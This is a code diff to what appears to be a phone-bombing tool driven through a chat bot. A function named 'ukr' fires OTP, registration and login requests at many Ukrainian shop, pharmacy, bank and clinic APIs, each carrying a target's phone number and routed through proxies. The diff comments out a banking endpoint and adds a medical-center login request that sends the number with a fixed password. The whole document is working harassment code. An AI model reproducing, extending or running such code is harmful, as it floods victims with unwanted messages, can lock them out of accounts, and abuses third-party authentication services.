@@ -22,7 +22,8 @@ from headers_main import (
     headers_uvape, cookies_uvape, headers_terravape, cookies_terravape,
     headers_moyo, cookies_moyo, headers_sushiya, headers_zolota, cookies_zolota,
     headers_avtoria, cookies_avtoria, headers_elmir, cookies_elmir, headers_elmir_call,
-    cookies_elmir_call, headers_apteka24, headers_ta_da, headers_monto, cookies_monto
+    cookies_elmir_call, headers_apteka24, headers_ta_da, headers_monto, cookies_monto,
+    headers_smartmedical, cookies_smartmedical
 )
 import asyncpg
 import config
@@ -1498,7 +1499,8 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
             # bounded_request("https://api.kolomarket.abmloyalty.app/v2.1/client/registration", **with_proxy({"json": {"phone": number, "password": "!EsRP2S-$s?DjT@", "token": "null"}, "headers": headers})),
             # bounded_request("https://ucb.z.apteka24.ua/api/send/otp", **with_proxy({"json": {"phone": number}, "headers": headers_apteka24})),
             # bounded_request("https://api.ta-da.net.ua/v1.1/mobile/user.auth", **with_proxy({"json": {"phone": formatted_number9}, "headers": headers_ta_da})),
-            bounded_request("https://mobilebanking.monto.com.ua/api-web/v1/authorization", **with_proxy({"json": {"form_id": "get_login", "login": number}, "headers": {**headers_monto, "device_id": monto_device_id, "fingerprint": monto_fingerprint}, "cookies": cookies_monto})),
+            # bounded_request("https://mobilebanking.monto.com.ua/api-web/v1/authorization", **with_proxy({"json": {"form_id": "get_login", "login": number}, "headers": {**headers_monto, "device_id": monto_device_id, "fingerprint": monto_fingerprint}, "cookies": cookies_monto})),
+            bounded_request("https://smartmedicalcenter.ua/health/", **with_proxy({"data": {"auth_login": number[2:], "auth_password": "1234567890"}, "headers": headers_smartmedical, "cookies": cookies_smartmedical})),
         ]
 
     if not attack_flags.get(chat_id):
